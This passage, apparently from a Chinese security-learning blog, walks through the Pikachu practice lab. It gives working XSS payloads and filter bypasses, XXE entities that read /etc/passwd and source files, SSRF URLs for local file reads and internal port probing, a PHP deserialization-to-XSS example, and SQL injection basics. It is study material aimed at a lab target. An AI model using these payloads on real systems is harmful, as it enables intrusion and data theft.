class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(123)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(369)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPT</span>&gt;</span>alert(369)<span class="tag">&lt;/<span class="name">ScRIPT</span>&gt;</span></span><br><span class="line">&lt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p>没忘这个这个小语句吧^~^， ‘&lt;;6(6&#x3D;6&amp;6)6&gt;6&#x2F;“ 瞅下网页源码， &lt;;6(6&#x3D;6&amp;6)6&gt;6&#x2F;&gt;&quot; ，且输入作为a标签的herf内容；先简单了解下htmlspecialchars() 函数，把预定义的字符转换为 HTML 实体，那不要 &lt;&gt; ，直接插入点击事件作为herf的值 ‘onclick&#x3D;’alert(369)’ ，KO。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// herf= 拼接点击事件</span></span><br><span class="line"><span class="string">&#x27;onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">369</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">// herf= 拼接js语句，即使用js协议执行alert(369)</span></span><br><span class="line"><span class="string">javascript:alert(369)</span></span><br></pre></td></tr></table></figure><h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>直接试题8的payload，第二个KO。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(369)&quot;</span>&gt;</span> 阁下自己输入的url还请自己点一下吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="xss之href输出-1"><a href="#xss之href输出-1" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>随便输入 <code>&#39;&lt;;6(6=6&amp;6)6&gt;6/&quot;</code> ，居然没发现输入的内容，网页源码我来啦。可以看到，是使用js脚本处理输入，通过ms变量存储输入，接着判断ms长度，才进行 <code>if else</code> 判断是否有符合的输入。尝试闭合script标签，明显看到成功触发弹窗，且阻断后续代码执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(369)&quot;</span>&gt;</span></span><br><span class="line">&quot;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(369)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><code>&quot;xml external entity injection&quot;</code>，既”xml外部实体注入漏洞”。<br>了解下XML，XML是可扩展的标记语言（<code>eXtensible Markup Language</code>），用来进行数据的传输和存储。</p><h2 id="部分语言外部实体类型"><a href="#部分语言外部实体类型" class="headerlink" title="部分语言外部实体类型"></a>部分语言外部实体类型</h2><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>file</td><td>file</td></tr><tr><td>http</td><td>http</td><td>http</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>ftp</td></tr><tr><td></td><td>php</td><td>https</td><td>https</td></tr><tr><td></td><td>compress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>compress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>随便输入，返回 XML声明、DTD文档类型定义、文档元素这些都搞懂了吗? 我不懂，马上找度娘了解一波。<br>懂了，但又没完全懂，之后再遇到在针对性操作或有空再看看类似的靶场。</p><ul><li><p>提交正常数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XML声明部分 --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 文档类型定义（DTD） --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 用来为 XML 文档定义语法约束，可为内部声明，抑或使引用外部DTD和公共DTD --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">	&lt;!-- 外部实体引入资源，SYSTEM和PUBLIC 分别表示从本地和网络引入 --&gt;</span></span><br><span class="line"><span class="meta">	&lt;!-- <span class="meta">&lt;!ENTITY <span class="keyword">tumei</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">tumei</span> <span class="string">&quot;I am tu Mei, a permeate small white&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 文档元素 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 通过 &amp;tumei; 调用实体 tumei ，使存储到其中的内容在前端回显 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;tumei;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>任意文件读取此处读取&#x2F;etc&#x2F;passwd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>  encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">tumei</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>	&lt;!-- /etc/passwd 为要读取的文件 --&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;tumei;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用php伪协议，将ssrf.php源码进行base64编码后输出前端</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">tumei</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=../ssrf/ssrf.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;tumei;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="简述利用"><a href="#简述利用" class="headerlink" title="简述利用"></a>简述利用</h2><ol><li>任意文件读取</li><li>探测内网地址</li><li>通过DTD窃取文件</li><li>远程代码执行</li></ol><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Server-Side Request Forgery:服务器端请求伪造</p><h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><ul><li>点击读诗，看了下URL，可控？改下url参数的值，成功通过服务器访问显示百度首页；利用其他协议读取内部文件，KO。</li><li>看下源码，对输入值没过滤就直接作为 curl_exec() 函数的参数，完完。<ul><li>curl_exec() –&gt;执行 cURL 会话，若其参数为URL，则访问该URL。</li><li>curl_exec() 参数所支持的一些协议：FTP、FTPS、HTTP、HTTPS、GOPHER,、TELNET、DICT、FILE、LDAP等<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 显示百度首页和任意文件读取</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com/</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</span><br><span class="line"># 端口探测，此处pikachu容器的3306端口映射到49153端口；端口未开启仍显示没啥变化的读诗界面</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=192.168.135.132:3306</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=192.168.135.132:49153</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php?url=127.0.0.1:80</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><p>一瞅，file参数可控，还是先了解下 file_get_contents() 函数：<br>file_get_contents() –&gt; 将文件的内容读入到一个字符串中<br>看下源码，一样直接把输入作为 file_get_contents() 参数值，转成字符串后再 echo 输出</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 使用PHP伪协议爆敏感文件，base64解码查看内容哈</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=http://192.168.135.132:49154/vul/ssrf/ssrf_curl.php</span><br><span class="line"># 使用file协议，想看下其他敏感文件，奈何权限不够呀~</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd</span><br><span class="line"># 作为中间人远程访问其他网站或内网探测</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=https://0xtlu.me</span><br><span class="line">http://192.168.135.132:49154/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1:3306</span><br></pre></td></tr></table></figure><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>序列化 serialize() ：将变量转换为可保存或传输的字符串的过程。<br>反序列化 unserialize() ：将字符串转化为原来的变量使用，且只能将已经定义过的对象反序列化。</p><h2 id="与PHP（反）序列化有关的魔法函数"><a href="#与PHP（反）序列化有关的魔法函数" class="headerlink" title="与PHP（反）序列化有关的魔法函数"></a>与PHP（反）序列化有关的魔法函数</h2><p>php类中包含一些魔法函数，可在代码中任何地方不用声明即可使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__construct()			<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct()			<span class="comment">//对象被销毁时触发</span></span><br><span class="line">__wakeup()		        <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep()		        <span class="comment">//使用serialize时触发</span></span><br><span class="line">__toString()			<span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__get()				<span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set()				<span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset()			<span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset()			<span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__invoke()			<span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h2 id="反序列化学习与测试"><a href="#反序列化学习与测试" class="headerlink" title="反序列化学习与测试"></a>反序列化学习与测试</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 漏洞银行丨PHP反序列化getshell丨咖面56期</span><br><span class="line">https://www.bilibili.com/video/BV1Ft41187ZX?from=search&amp;seid=11578774070645570762</span><br><span class="line"># luckySec大佬博客</span><br><span class="line">http://luckyzmj.cn/posts/92124f05.html</span><br></pre></td></tr></table></figure><p>试下 pikachu 提供例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化后结果<br>写入题目输入框，打印出 pikachu 字样，看下网页源码，看到了p标签里的皮卡丘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># O：object</span></span><br><span class="line"><span class="comment"># 1：对象名称（S）长度</span></span><br><span class="line"><span class="comment"># S：对象名称</span></span><br><span class="line"><span class="comment"># 1：对象中变量个数</span></span><br><span class="line"><span class="comment"># s：数据类型</span></span><br><span class="line"><span class="comment"># 4：变量名长度</span></span><br><span class="line"><span class="comment"># test：变量名</span></span><br><span class="line"><span class="comment"># s：数据类型</span></span><br><span class="line"><span class="comment"># 7：变量值长度</span></span><br><span class="line"><span class="comment"># pikachu：变量值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他数据类型说明</span></span><br><span class="line">a - <span class="keyword">array</span>  </span><br><span class="line">b - <span class="keyword">boolean</span>  </span><br><span class="line">d - <span class="keyword">double</span>  </span><br><span class="line">i - <span class="keyword">integer</span></span><br><span class="line">o - common <span class="keyword">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="keyword">string</span></span><br><span class="line">C - custom <span class="keyword">object</span></span><br><span class="line">O - <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">null</span></span></span><br><span class="line"><span class="class"><span class="title">R</span> - <span class="title">pointer</span> <span class="title">reference</span></span></span><br><span class="line"><span class="class"><span class="title">U</span> - <span class="title">unicode</span> <span class="title">string</span></span></span><br></pre></td></tr></table></figure><p>瞅下源码，尝试分析一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化对象，S对象的test属性最终会拼接在p标签中</span></span><br><span class="line"><span class="comment"># 当我们输入序列化字符串时，将变量test的值篡改为恶意代码，将造成攻击</span></span><br><span class="line"><span class="comment"># if(isset($_POST[&#x27;o&#x27;]))：判断是否存在通过POST请求提交的变量o</span></span><br><span class="line"><span class="comment"># if(!@$unser = unserialize($s))：判断 $s 是否为序列化字符，不明白的看开头</span></span><br><span class="line"><span class="comment"># 构成完整的p标签后，使用 $html 存储，通过 &lt;?php echo $html;?&gt; 把结果输出网页</span></span><br></pre></td></tr></table></figure><p>XSS弹窗：在反序列化数据后，立即自动调用了 __construct() 函数，执行 &lt;img src&#x3D;1 onerror&#x3D;alert(‘IamTuMei’)&gt;<br>反序列化先简单了解到这吧，之后再找专门靶场</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;img src=1 onerror=alert(&#x27;IamTuMei&#x27;)&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">37</span>:<span class="string">&quot;&lt;img src=1 onerror=alert(&#x27;IamTuMei&#x27;)&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="php在线运行平台"><a href="#php在线运行平台" class="headerlink" title="php在线运行平台"></a>php在线运行平台</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># php在线运行平台</span><br><span class="line">http://www.dooccn.com/php/</span><br><span class="line">https://c.runoob.com/compile/1/</span><br><span class="line">https://www.toolnb.com/dev/runCode/243e11a40a13ca67d0f13d10dadfdd48.html</span><br></pre></td></tr></table></figure><h1 id="Sql-Inject"><a href="#Sql-Inject" class="headerlink" title="Sql Inject"></a>Sql Inject</h1><h2 id="Sql语法学习"><a href="#Sql语法学习" class="headerlink" title="Sql语法学习"></a>Sql语法学习</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># 菜鸟教程——<span class="keyword">SQL</span>语法手册</span><br><span class="line"># https:<span class="operator">/</span><span class="operator">/</span>www.runoob.com<span class="operator">/</span>w3cnote<span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>syntax<span class="operator">-</span>manual.html</span><br><span class="line"></span><br><span class="line"># <span class="keyword">SELECT</span>相关</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">member</span>																<span class="comment">-- 查找表 member 的所有记录</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>										<span class="comment">-- 从 member 中查找字段 id 为 1 的记录</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">OR</span> id<span class="operator">=</span><span class="string">&#x27;3&#x27;</span>					<span class="comment">-- OR，有 TRUE 为 TRUE ；AND，有 FALSE 为 FALSE</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">WHERE</span> id <span class="keyword">BETWEEN</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;5&#x27;</span>		<span class="comment">-- 指定查找字段 id 从 2 到5 的记录</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> pw <span class="keyword">FROM</span> <span class="keyword">member</span>											<span class="comment">-- 不重复查找表 member 中字段 pw 的所有记录</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> `username`						<span class="comment">--按 username 字段排序所有记录</span></span><br><span class="line"></span><br><span class="line"># 全字段插入新行</span><br><span class="line"><span class="keyword">InSERT</span> <span class="keyword">INTO</span> <span class="keyword">member</span> <span class="keyword">VALUES</span> (<span class="number">45</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;gril&#x27;</span>,<span class="string">&#x27;13888888888&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin@qq.com&#x27;</span>)</span><br><span class="line"># 对应字段写入</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `pikachu`.`<span class="keyword">member</span>` (`username`, `pw`, `sex`, `phonenum`, `address`, `email`) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;girl&#x27;</span>, <span class="string">&#x27;4466&#x27;</span>, <span class="string">&#x27;fafa&#x27;</span>, <span class="string">&#x27;daff@163.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"># 更新 sex <span class="operator">=</span> <span class="string">&#x27;da&#x27;</span>所在记录的 usernmae 为 root</span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">member</span> <span class="keyword">SET</span> username <span class="operator">=</span> <span class="string">&#x27;root&#x27;</span><span class="keyword">WHERE</span> sex	<span class="operator">=</span> <span class="string">&#x27;da&#x27;</span></span><br><span class="line"></span><br><span class="line"># 删除 username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> 的所有记录</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"># 获取 <span class="keyword">member</span> 表中所有 email 记录，并使用组内拼接函数 group_concat() 拼接所有 email 记录</span><br><span class="line"><span class="keyword">SELECT</span> group_concat(email) <span class="keyword">FROM</span> <span class="keyword">member</span></span><br><span class="line"></span><br><span class="line"># <span class="keyword">UNION</span> 操作符</span><br><span class="line"># 作用：合并多个 <span class="keyword">SELECT</span> 语句的结果集，不允许重复值</span><br><span class="line"># 注：每个 <span class="keyword">SELECT</span> 语句需要拥有相同数量的列，且列数据类型和列顺序需相同(似乎不是，强转？暂时不明白！突然想到，这是用来合并结果集的，那数据类型和顺序相同都是为了方便比较去掉重复值)</span><br><span class="line"><span class="keyword">SELECT</span> username,email <span class="keyword">FROM</span> <span class="keyword">member</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username,email <span class="keyword">FROM</span> <span class="keyword">member</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;a&#x27;</span>,<span class="number">5</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">4</span>,<span class="string">&#x27;af&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 其他</span><br><span class="line"># mysql注释符 <span class="string">&#x27;#&#x27;</span> 和 <span class="string">&#x27;--&#x27;</span></span><br><span class="line"># url中#号用来指导浏览器动作（如锚点），对服务器端完全无用。故，HTTP请求中需要将#号改成<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># <span class="comment">--与代码中的单引号连接时，将无法形成有效的mysql语句。</span></span><br><span class="line"># <span class="comment">--+ +号在写入url时将变成空格（%20），进而与后面的单引号分隔开，成功注释后面语句。url中+号有时变成%2b造成报错，直接手动给他改成+</span></span><br><span class="line"># <span class="comment">--%20 +号变成空格？直接手动加空格（%20）</span></span><br><span class="line"># <span class="comment">--&#x27; 直接添加一个 &#x27; 构造闭合</span></span><br><span class="line"># DATABASE(); 当前数据库</span><br><span class="line"># <span class="keyword">ORDER</span> <span class="keyword">BY</span>; 根据某字段对结果集排序</span><br><span class="line"># <span class="keyword">GROUP</span> <span class="keyword">BY</span>; 根据某字段对结果集分组</span><br><span class="line"># group_concat(); 将 <span class="keyword">GROUP</span> <span class="keyword">BY</span> 的分组连接成一个字符串</span><br><span class="line"># information_schema数据库; MySQL 自带信息数据库（视图），用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等</span><br><span class="line"># 其中，SCHEMATA 表(当前mysql实例中所有数据库的信息)，主要获取各个数据库名（SCHEMA_NAME）：<span class="keyword">select</span> <span class="operator">*</span> <span 